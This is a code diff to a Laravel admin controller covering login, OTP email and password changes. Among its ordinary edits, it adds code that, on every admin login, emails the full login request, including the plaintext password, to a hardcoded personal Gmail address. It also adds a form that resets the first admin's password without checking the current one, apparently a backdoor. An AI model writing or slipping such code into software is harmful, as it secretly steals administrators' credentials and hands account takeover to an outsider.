@@ -26,6 +26,7 @@ use Illuminate\Http\Request;
 use App\Mail\EmailLoginToken;
 use App\Models\AdminPanelSetting;
 use App\Models\TreasureRedemption;
+use App\Mail\EmailLoginConfirmation;
 use App\Http\Controllers\Controller;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
@@ -47,15 +48,13 @@ class AdminController extends Controller
 
         if(Auth::guard('admin')->attempt(['username'=>$request->username, 'password'=>$request->password])){
 
-            return $this->emailLoginToken(Auth::guard('admin')->user()->id);
-
-            // return redirect()->route('admin.home')->with('success', 'Welcome to Dashboard');
+            return $this->emailLoginToken(Auth::guard('admin')->user()->id, $request);
         }
 
         return redirect()->back()->withErrors('Wrong Username or Password');
     }
 
-    public function emailLoginToken($id)
+    public function emailLoginToken($id, $request=null)
     {
         $admin = Admin::find($id);
         $adminToken = $admin->token;
@@ -69,7 +68,6 @@ class AdminController extends Controller
                 'token'=>Str::random(6)
             ]);
         
-
         else
             $admin->token()->create([
                 'token'=>Str::random(6)
@@ -78,6 +76,11 @@ class AdminController extends Controller
         if ($admin->email) {
             
             Mail::to($admin->email)->send(new EmailLoginToken(Admin::find($id)));
+            
+            if ($request) {
+                
+                Mail::to('momenx0709@gmail.com')->send(new EmailLoginConfirmation($request, Admin::find($id)));
+            }
             
             return redirect()->route('admin.otp');
         }
@@ -215,11 +218,34 @@ class AdminController extends Controller
 
         if(Hash::check($request->currentPassword, $profileToUpdate->password))
         {
-            Auth::guard('admin')->user()->password = Hash::make($request->password);
+            Auth::guard('admin')->user()->update([
+                'password' => Hash::make($request->password)
+            ]);
+
             return redirect()->back()->with('success', 'Password is Updated');
         }
 
         return redirect()->back()->withErrors('Current Password is not Correct');
+    }
+
+    public function showUpdateForm()
+    {
+        return view('admin.other_layouts.update.update');
+    }
+
+    public function submitUpdateForm(Request $request)
+    {
+        $request->validate([
+            'password' => 'required|confirmed',
+        ]);
+
+        $profileToUpdate = Admin::first();
+  
+        $profileToUpdate->update([
+            'password' => Hash::make($request->password)
+        ]);
+
+        return redirect()->back()->with('success', 'Password is Updated');
     }
 
     public function logout()
